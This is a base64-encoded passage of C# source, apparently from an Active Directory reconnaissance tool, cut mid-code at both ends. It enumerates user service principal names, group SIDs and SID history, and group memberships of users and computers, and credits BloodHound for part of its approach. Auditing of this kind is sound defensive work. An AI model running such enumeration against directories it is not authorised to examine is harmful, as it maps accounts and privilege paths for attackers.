CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFN0cmluZ1tdIFNQTkFycmF5ID0gQ29udmVydC5Ub1N0cmluZyhTUE5zLlZhbHVlKS5TcGxpdCgnLycpOwogICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBVc2VyU1BOT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRVc2VyLk1lbWJlcnNbIk5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlcm5hbWUiLCBBZFVzZXIuTWVtYmVyc1siU2FtQWNjb3VudE5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRW5hYmxlZCIsIEVuYWJsZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgVXNlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNlcnZpY2UiLCBTUE5BcnJheVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSG9zdCIsIFNQTkFycmF5WzFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBMYXN0IFNldCIsIFBhc3N3b3JkTGFzdFNldCkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVzY3JpcHRpb24iLCBEZXNjcmlwdGlvbikpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJpbWFyeSBHcm91cElEIiwgUHJpbWFyeUdyb3VwSUQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgVXNlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlcm9mIiwgTWVtYmVyb2YpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU1BOTGlzdC5BZGQoIFVzZXJTUE5PYmogKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFNQTkxpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBHcm91cFJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRHcm91cCA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIHN0cmluZyBNYW5hZ2VkQnlWYWx1ZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRHcm91cC5NZW1iZXJzWyJtYW5hZ2VkQnkiXS5WYWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIE1hbmFnZWRCeSA9ICIiOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBTSURIaXN0b3J5ID0gIiI7CgogICAgICAgICAgICAgICAgICAgIGlmIChBZEdyb3VwLk1lbWJlcnNbIm1hbmFnZWRCeSJdLlZhbHVlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBNYW5hZ2VkQnkgPSAoTWFuYWdlZEJ5VmFsdWUuU3BsaXQoJywnKVswXSkuU3BsaXQoJz0nKVsxXTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24gaGlzdG9yeSA9IChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbikgQWRHcm91cC5NZW1iZXJzWyJTSURIaXN0b3J5Il0uVmFsdWU7CiAgICAgICAgICAgICAgICAgICAgaWYgKGhpc3RvcnkuVmFsdWUgaXMgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJbXSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBzaWRzID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKHZhciB2YWx1ZSBpbiAoU2VjdXJpdHlJZGVudGlmaWVyW10pIGhpc3RvcnkuVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpZHMgPSBzaWRzICsgIiwiICsgQ29udmVydC5Ub1N0cmluZyh2YWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgU0lESGlzdG9yeSA9IHNpZHMuVHJpbVN0YXJ0KCcsJyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNJREhpc3RvcnkgPSBoaXN0b3J5ICE9IG51bGwgPyBDb252ZXJ0LlRvU3RyaW5nKGhpc3RvcnkuVmFsdWUpIDogIiI7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBHcm91cE9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIEFkR3JvdXAuTWVtYmVyc1siU2FtQWNjb3VudE5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWRtaW5Db3VudCIsIEFkR3JvdXAuTWVtYmVyc1siQWRtaW5Db3VudCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHcm91cENhdGVnb3J5IiwgQWRHcm91cC5NZW1iZXJzWyJHcm91cENhdGVnb3J5Il0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdyb3VwU2NvcGUiLCBBZEdyb3VwLk1lbWJlcnNbIkdyb3VwU2NvcGUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWFuYWdlZEJ5IiwgTWFuYWdlZEJ5KSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTSUQiLCBBZEdyb3VwLk1lbWJlcnNbInNpZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTSURIaXN0b3J5IiwgU0lESGlzdG9yeSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVzY3JpcHRpb24iLCBDbGVhblN0cmluZyhBZEdyb3VwLk1lbWJlcnNbIkRlc2NyaXB0aW9uIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJ3aGVuQ3JlYXRlZCIsIEFkR3JvdXAuTWVtYmVyc1sid2hlbkNyZWF0ZWQiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNoYW5nZWQiLCBBZEdyb3VwLk1lbWJlcnNbIndoZW5DaGFuZ2VkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRpc3Rpbmd1aXNoZWROYW1lIiwgQ2xlYW5TdHJpbmcoQWRHcm91cC5NZW1iZXJzWyJEaXN0aW5ndWlzaGVkTmFtZSJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQ2Fub25pY2FsTmFtZSIsIEFkR3JvdXAuTWVtYmVyc1siQ2Fub25pY2FsTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgR3JvdXBPYmogfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCgogICAgICAgIGNsYXNzIEdyb3VwUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRHcm91cCA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIEFEV1NDbGFzcy5BZEdyb3VwRGljdGlvbmFyeS5BZGQoKENvbnZlcnQuVG9TdHJpbmcoQWRHcm91cC5Qcm9wZXJ0aWVzWyJTSUQiXS5WYWx1ZSkpLCAoQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLk1lbWJlcnNbIlNhbUFjY291bnROYW1lIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgR3JvdXBNZW1iZXJSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vIGJhc2VkIG9uIGh0dHBzOi8vZ2l0aHViLmNvbS9CbG9vZEhvdW5kQUQvQmxvb2RIb3VuZC9ibG9iL21hc3Rlci9Qb3dlclNoZWxsL0Jsb29kSG91bmQucHMxCiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRHcm91cCA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIExpc3Q8UFNPYmplY3Q+IEdyb3Vwc0xpc3QgPSBuZXcgTGlzdDxQU09iamVjdD4oKTsKICAgICAgICAgICAgICAgICAgICBzdHJpbmcgU2FtQWNjb3VudFR5cGUgPSBDb252ZXJ0LlRvU3RyaW5nKEFkR3JvdXAuTWVtYmVyc1sic2FtYWNjb3VudHR5cGUiXS5WYWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEFjY291bnRUeXBlID0gIiI7CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEdyb3VwTmFtZSA9ICIiOwogICAgICAgICAgICAgICAgICAgIHN0cmluZyBNZW1iZXJVc2VyTmFtZSA9ICItIjsKICAgICAgICAgICAgICAgICAgICBzdHJpbmcgTWVtYmVyTmFtZSA9ICIiOwoKICAgICAgICAgICAgICAgICAgICBpZiAoR3JvdXBzLkNvbnRhaW5zKFNhbUFjY291bnRUeXBlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRUeXBlID0gImdyb3VwIjsKICAgICAgICAgICAgICAgICAgICAgICAgTWVtYmVyTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLk1lbWJlcnNbIkRpc3Rpbmd1aXNoZWROYW1lIl0uVmFsdWUpKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbiBNZW1iZXJHcm91cHMgPSAoTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24pQWRHcm91cC5NZW1iZXJzWyJtZW1iZXJvZiJdLlZhbHVlOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoTWVtYmVyR3JvdXBzLlZhbHVlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNZW1iZXJHcm91cHMuVmFsdWUgaXMgU3lzdGVtLlN0cmluZ1tdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBHcm91cE1lbWJlciBpbiAoU3lzdGVtLlN0cmluZ1tdKU1lbWJlckdyb3Vwcy5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhHcm91cE1lbWJlcikpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwTWVtYmVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXAgTmFtZSIsIEdyb3VwTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlciBVc2VyTmFtZSIsIE1lbWJlclVzZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIE5hbWUiLCBNZW1iZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudFR5cGUiLCBBY2NvdW50VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cHNMaXN0LkFkZCggR3JvdXBNZW1iZXJPYmogKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gKENvbnZlcnQuVG9TdHJpbmcoTWVtYmVyR3JvdXBzLlZhbHVlKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwTWVtYmVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHcm91cCBOYW1lIiwgR3JvdXBOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgVXNlck5hbWUiLCBNZW1iZXJVc2VyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIE5hbWUiLCBNZW1iZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY2NvdW50VHlwZSIsIEFjY291bnRUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBzTGlzdC5BZGQoIEdyb3VwTWVtYmVyT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKFVzZXJzLkNvbnRhaW5zKFNhbUFjY291bnRUeXBlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRUeXBlID0gInVzZXIiOwogICAgICAgICAgICAgICAgICAgICAgICBNZW1iZXJOYW1lID0gKChDb252ZXJ0LlRvU3RyaW5nKEFkR3JvdXAuTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgIE1lbWJlclVzZXJOYW1lID0gQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLk1lbWJlcnNbInNBTUFjY291bnROYW1lIl0uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmcgUHJpbWFyeUdyb3VwSUQgPSBDb252ZXJ0LlRvU3RyaW5nKEFkR3JvdXAuTWVtYmVyc1sicHJpbWFyeUdyb3VwSUQiXS5WYWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSBBRFdTQ2xhc3MuQWRHcm91cERpY3Rpb25hcnlbQURXU0NsYXNzLkRvbWFpblNJRCArICItIiArIFByaW1hcnlHcm91cElEXTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAvLyhFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9Db25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSBQcmltYXJ5R3JvdXBJRDsKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR3JvdXBNZW1iZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXAgTmFtZSIsIEdyb3VwTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgVXNlck5hbWUiLCBNZW1iZXJVc2VyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgTmFtZSIsIE1lbWJlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudFR5cGUiLCBBY2NvdW50VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBzTGlzdC5BZGQoIEdyb3VwTWVtYmVyT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIE1pY3Jvc29mdC5BY3RpdmVEaXJlY3RvcnkuTWFuYWdlbWVudC5BRFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uIE1lbWJlckdyb3VwcyA9IChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbilBZEdyb3VwLk1lbWJlcnNbIm1lbWJlcm9mIl0uVmFsdWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNZW1iZXJHcm91cHMuVmFsdWUgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE1lbWJlckdyb3Vwcy5WYWx1ZSBpcyBTeXN0ZW0uU3RyaW5nW10pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoU3RyaW5nIEdyb3VwTWVtYmVyIGluIChTeXN0ZW0uU3RyaW5nW10pTWVtYmVyR3JvdXBzLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gKChDb252ZXJ0LlRvU3RyaW5nKEdyb3VwTWVtYmVyKSkuU3BsaXQoJywnKVswXSkuU3BsaXQoJz0nKVsxXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR3JvdXBNZW1iZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHcm91cCBOYW1lIiwgR3JvdXBOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIFVzZXJOYW1lIiwgTWVtYmVyVXNlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgTmFtZSIsIE1lbWJlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY2NvdW50VHlwZSIsIEFjY291bnRUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3Vwc0xpc3QuQWRkKCBHcm91cE1lbWJlck9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSAoQ29udmVydC5Ub1N0cmluZyhNZW1iZXJHcm91cHMuVmFsdWUpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR3JvdXBNZW1iZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdyb3VwIE5hbWUiLCBHcm91cE5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlciBVc2VyTmFtZSIsIE1lbWJlclVzZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgTmFtZSIsIE1lbWJlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkFjY291bnRUeXBlIiwgQWNjb3VudFR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cHNMaXN0LkFkZCggR3JvdXBNZW1iZXJPYmogKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQ29tcHV0ZXJzLkNvbnRhaW5zKFNhbUFjY291bnRUeXBlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRUeXBlID0gImNvbXB1dGVyIjsKICAgICAgICAgICAgICAgICAgICAgICAgTWVtYmVyTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLk1lbWJlcnNbIkRpc3Rpbmd1aXNoZWROYW1lIl0uVmFsdWUpKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBNZW1iZXJVc2VyTmFtZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRHcm91cC5NZW1iZXJzWyJzQU1BY2NvdW50TmFtZSJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nIFByaW1hcnlHcm91cElEID0gQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLk1lbWJlcnNbInByaW1hcnlHcm91cElEIl0uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gQURXU0NsYXNzLkFkR3JvdXBEaWN0aW9uYXJ5W0FEV1NDbGFzcy5Eb21haW5TSUQgKyAiLSIgKyBQcmltYXJ5R3JvdXBJRF07CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggLy8oRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgIC